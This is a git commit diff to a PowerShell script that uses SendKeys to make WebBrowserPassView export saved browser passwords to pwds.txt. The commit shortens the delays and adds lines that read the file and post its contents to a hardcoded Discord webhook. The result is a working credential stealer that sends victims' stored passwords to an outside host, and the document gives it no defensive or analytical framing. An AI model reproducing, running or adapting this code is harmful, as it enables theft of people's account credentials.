935541ca7ba10b7b6ffb3ed7e04c5b7cf62a815a
Peach-Iced-Tea <134111163+Peach-Iced-Tea@users.noreply.github.com>
2024-11-14 20:18:45 +0100

    Update sendKeyX.ps1

--- sendKeyX.ps1
+++ sendKeyX.ps1
@@ -1,10 +1,20 @@
 $wshell = New-Object -ComObject wscript.shell;
 $wshell.AppActivate('WebBrowserPassView')
-Sleep 5
+Sleep 1
 $wshell.SendKeys("^{a}")
-Sleep 5
+Sleep 1
 $wshell.SendKeys("^{s}")
 Sleep 1
 $wshell.SendKeys("pwds.txt")
 Sleep 1
 $wshell.SendKeys("~")
+
+$PassContent = Get-Content pwds.txt
+
+$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
+
+$msg = @{
+    content = $PassContent
+} | ConvertTo-Json
+
+Invoke-WebRequest -Uri $URL -Method Post -Body $msg -ContentType "application/json" | Out-Null
